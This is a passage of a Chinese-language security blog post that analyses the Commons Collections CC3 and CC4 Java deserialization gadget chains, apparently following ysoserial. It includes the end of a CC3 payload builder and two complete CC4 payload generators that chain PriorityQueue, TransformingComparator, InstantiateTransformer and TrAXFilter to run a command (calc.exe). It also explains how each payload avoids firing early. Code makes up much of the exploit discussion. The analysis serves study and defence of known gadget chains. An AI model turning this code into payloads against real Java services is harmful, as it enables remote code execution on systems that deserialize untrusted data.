            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
            final Constructor constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
            final Map testMap = new HashMap();
            Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
            );
            final Constructor ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
            byte[] serializeData=serialize(handler);
            unserialize(serializeData);
        }
这个是主函数代码，完整代码在
## 0x03 CommonsCollections4 分析
CC4 链的命令执行采用的CC3的技术，触发部分还是沿用CC2中的结构。因此分析到这，CC4应该是前四个链中最容易理解的了。命令执行部分参照
上节的分析，简单介绍下调用链和`Payload`编写方法。
###  0x1 调用链分析
触发点是 `PriorityQueue` 里的比较器`compare`方法，之后又调用了`transformer`方法
具体调用可以参考CC2分析的那篇文章，下面是调用链
    Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
            ...
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            TrAXFilter.TrAXFilter()
                                ...
                                    exec()
整个触发链没有什么难理解的，可以归结为下图调用逻辑。
###  0x2 Payload 编写方法
ysoserial 中的利用方法很有艺术感，用到了两处伪装 和 属性变换  
将paramTypes和args设置为正常的字符串类型和字符串值
**1\. 伪装**
伪装比较器的第一个Transformer元素
    ConstantTransformer constant = new ConstantTransformer(String.class);
    ...
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
在`queue`执行`add`方法后将 `ConstantTransformer`中的`iConstant`变量改为`TrAXFilter.class`
* * *
第二个伪装在
这里伪装的原因也是和简单的，在CC2 那篇文章里已经说过了，这里再唠叨两句，`queue`在使用add方法添加元素的时候会触发
比较器进行比较，如果这里运用了正常的payload，那么将会在这里的触发命令执行，程序将会在反序列化之前终止。
因此要进行一次伪装，那么为什么要添加两个元素呢，其实在之前CC2的分析中也有涉及到，因为在`queue`反序列化的时候会把每个元素读取出来，并且执行到`heapify`函数，如果此时元素数为零就不会触发该链，因此只能这么设计
采用以下方法修改queue的两个元素
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
    paramTypes[0] = Templates.class;
    args[0] = templates;
首先运用getDeclaredField方法获取到对象的iParamTypes和iArgs属性，之后直接给这两个属性赋值，即可完成替换。
**2\. 手动构造**
看过ysoserial封装好的代码后，根据自己的理解自己手动构造功能类似的payload，这里从参考了其他师傅的构造方式，写出了两版利用代码
    public static void main(String[]  args) throws Exception {
            final Object templates = createTemplatesImpl("calc.exe");
            // mock method name until armed
            ConstantTransformer constant = new ConstantTransformer( TrAXFilter.class);
            Class[] paramTypes = new Class[] { Templates.class };
            Object[] argsv = new Object[] { templates };
            InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, argsv);
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
            // create queue with numbers and basic comparator
            final PriorityQueue queue = new PriorityQueue(2);
            queue.add(1);
            queue.add(1);
            TransformingComparator transCom = new TransformingComparator(chain);
            Field com = PriorityQueue.class.getDeclaredField("comparator");
            com.setAccessible(true);
            com.set(queue,transCom);
            byte[] serializeData=serialize(queue);
            unserialize(serializeData);
        }
这一版的代码很巧妙，学习了tr1ple师傅的方法，这样只需伪装一步就可以实现绕过queue的add方法的触发利用链。在添加完元素后再利用反射动态添加比较器
`comparator`，这样就避免修改元素较多的instantiate对象
* * *
ysoserial 采用的修改instantiate对象中的属性和ConstantTransformer中的属性
     public static void main(String[]  args) throws Exception {
            final Object templates = createTemplatesImpl("calc.exe");
            // mock method name until armed
            ConstantTransformer constant = new ConstantTransformer(String.class);
            Class[] paramTypes = new Class[] { String.class };
            Object[] argsv = new Object[] { "foo" };
            InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, argsv);
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
            // create queue with numbers and basic comparator
            final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(chain));
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
            Field com = instantiate.getClass().getDeclaredField("iParamTypes");
            com.setAccessible(true);
            com.set(instantiate,new Class[] { Templates.class });
            Field com1 = instantiate.getClass().getDeclaredField("iArgs");
            com1.setAccessible(true);
            com1.set(instantiate,new Object[] { templates });
            // switch method called by comparator
            setFieldValue(constant, "iConstant", TrAXFilter.class);
            byte[] serializeData=serialize(queue);
            unserialize(serializeData);
        }
在执行add方法后，将instantiate对象的iParamTypes和iArgs赋值构造好的变量，并把ConstantTransformer对象中的iConstant变量设置为TrAXFilter.class，以此完成最后的利用。
将完整版的代码上传至github
## 0x04 总结
分析过这两个链后，感悟就又不一样了，主要有以下几个方面：
###  0x1 为什么有这两个链
CC3
只有命令部分是比较新颖的，使用的是TrAXFilter类配合插入恶意字节码的templates进行命令执行，但值得注意的是这个新的命令执行可以做到各个commons-collections版本通杀，以至于在CC4
也在使用这个触发方式。那么可以这么说CC3和CC4存在的意义就在于运用这个命令执行方式，以至于前面的触发链和CC1、CC2几乎一样。
###  0x2 命令执行方式是多样化的
在分析CC3的命令执行方式时，介绍了三种相似的利用姿势，但其核心都是利用插入恶意字节码的templates进行命令执行，从这一点来讲都是一样的，不一样的点是怎么触犯templates的newTransformer方法。这三种方式分别是
  1. 通过 InvokerTransformer 执行 newTransformer
  2. 通过invoke的方式调用 TrAXFilter.class 的getConstructor，newInstance完成有参实例的初始化
  3. 利用InstantiateTransformer 直接完成TrAXFilter的实例构建
###  0x3 反射真的很重要
在反序列化利用的过程中处处都有遇到反射，反射调用方法链，反射获取对象变量，反射动态修改对象变量。反射的概念有与Class类有着很大的关联，Class对象是保存类的基础信息的对象，在本文的命令执行方式分析中，用到了很多反射的姿势，有兴趣的小伙伴可以好好研究下。
## 0x05 参考文章